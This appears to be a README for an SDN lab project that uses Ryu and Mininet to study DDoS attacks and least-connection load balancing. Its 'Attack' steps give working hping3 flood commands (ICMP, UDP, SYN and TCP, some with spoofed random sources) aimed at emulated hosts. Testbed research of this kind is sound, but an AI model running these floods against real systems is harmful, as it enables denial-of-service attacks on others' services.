# How to Run DDoS:
1. Start the SDN Controller
```bash
ryu-manager controller.py
```
2. Run the Network Topology (Mininet)
```bash
sudo python topology.py
```
3. Ping (Mininet)
```bash
h1 ping h2
```
4. Attack
```bash
# ICMP flood
hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.1

# UDP flood
hping3 -2 -V -d 120 -w 64 --rand-source --flood 10.0.0.1 

# SYN flood
hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.1

# TCP flood
hping3 -A -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.1
```
-----------------------------------------------------------------
# How to run LB+DDoS :
### Step 1: Run topology:
Open Terminal 1:
```bash
sudo python3 LB_DDOS/topo.py
```
### Step 2: Run controller algorithm:
Open Terminal 2:
Remember enable environment 
```bash
source name_of_env/bin/activate
```
Then, run controller
```bash
ryu-manager LB_DDOS/lb_least_conn.py
```
### Step 3: Run server:
Back to Terminal 1:
```bash
mininet> h1 python3 /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/Benchmark/server.py 10.0.0.1 h1 &
mininet> h2 python3 /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/Benchmark/server.py 10.0.0.1 h2 &
mininet> h3 python3 /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/Benchmark/server.py 10.0.0.1 h3 &
mininet> h4 python3 /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/Benchmark/server.py 10.0.0.1 h4 &
mininet> h5 python3 /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/Benchmark/server.py 10.0.0.1 h5 &
mininet> h6 python3 /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/Benchmark/server.py 10.0.0.1 h6 &
```
### Step 4: Run benchmark:
``` bash
mininet> c1 python3 /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/Benchmark/run_benchmark.py 30
```
### Step 5: Permission to run folder:
``` bash
sudo chown -R minhviet:minhviet /home/minhviet/Documents/SDN/model/LoadBalancing_DDoS/visualize/results/
```
### Step 6: Visualize:
``` bash
python3 visualize/plot_results.py <folder_name>
```
### Step 7: Attack:
``` bash
c1 hping3 -S -p 80 --flood 10.0.0.100
```


